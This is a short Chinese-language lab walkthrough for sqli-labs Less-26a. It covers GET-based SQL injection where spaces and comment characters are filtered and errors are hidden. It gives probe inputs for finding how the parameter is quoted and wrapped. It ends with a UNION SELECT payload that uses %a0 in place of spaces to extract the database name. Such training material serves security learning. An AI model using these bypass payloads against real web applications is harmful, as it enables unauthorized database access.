# Less-26a **GET Trick with comments**  
TAG：GET型注入、空格与注释符过滤  
## 漏洞利用  
此less为less26的变种，它关闭了报错信息的输出，在确定参数包裹方式上存在一定的障碍  
![less26a_1](images\less26a_1.png)  
  
这里简单讲解一种判断方法：  
在荷载参数中分别输入```1```,```1"```,```1'```,查看回显  
payload:```?id=1```  
![less26a_2](images\less26a_2.png)  
payload:```?id=1"```  
![less26a_3](images\less26a_3.png)  
payload:```?id=1'```  
![less26a_4](images\less26a_4.png)  
1和1"正常回显，1'无回显，可以判断为字符型  
  
现在判断一下存不存在小括号包裹  
payload:```1')||'1'=('1```
![less26a_5](images\less26a_5.png)  
正常回显说明语句含有小括号  
  
恶意语句的构造方式与less26类似  
Payload:```?id=0')%a0union%a0select%a02,database(),4%a0||%a0('1')=('1```
![less26a_6](images\less26a_6.png)  

